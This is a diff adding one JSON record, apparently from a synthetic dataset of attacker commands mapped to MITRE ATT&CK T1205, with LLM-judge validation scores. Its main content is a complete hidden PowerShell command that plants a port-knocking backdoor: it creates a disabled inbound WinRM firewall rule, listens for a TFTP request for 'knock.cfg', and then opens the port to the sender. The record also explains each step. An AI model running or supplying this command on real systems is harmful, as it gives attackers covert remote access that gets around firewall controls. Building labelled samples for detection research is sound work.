@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(69); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 4 -and $d[0] -eq 0 -and $d[1] -eq 1){ $i=2; $bytes=@(); while($i -lt $d.Length -and $d[$i] -ne 0){ $bytes+=$d[$i]; $i++ }; $fn=[Text.Encoding]::ASCII.GetString($bytes,0,$bytes.Length); if($fn -eq ''knock.cfg''){ Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Enabled True -RemoteAddress $ep.Address; break } } } }'",
+  "explanation": "Monitors TFTP (UDP/69) RRQ packets (opcode 0x0001) and parses the filename field. A request for 'knock.cfg' serves as the signal to enable the WinRM HTTPS firewall rule for the requesting host.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/5986.",
+    "Bind to UDP/69 and parse RRQ (opcode 1) filename per TFTP format.",
+    "Enable the firewall rule when the sentinel filename is requested."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-d47832aa",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes/braces, proper escaping of embedded single quotes, and a valid PowerShell/WMI invocation structure.",
+        "semantic_score": 3,
+        "semantic_justification": "It implements a TFTP RRQ-based signal to toggle a specific WinRM firewall rule (aligned with T1205), but changing firewall rules requires admin privileges (contradicting 'Privilege: None') and inbound UDP/69 may be blocked, reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T17:05:49.115515Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, proper command chaining, and valid flag usage, including the necessary escaping for inner strings.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command perfectly implements the logic for TFTP traffic signaling (T1205) and the intended actions, its operational feasibility is severely hampered by the stated 'Privilege: None' as firewall rule modifications require Administrator privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T17:06:26.961956Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
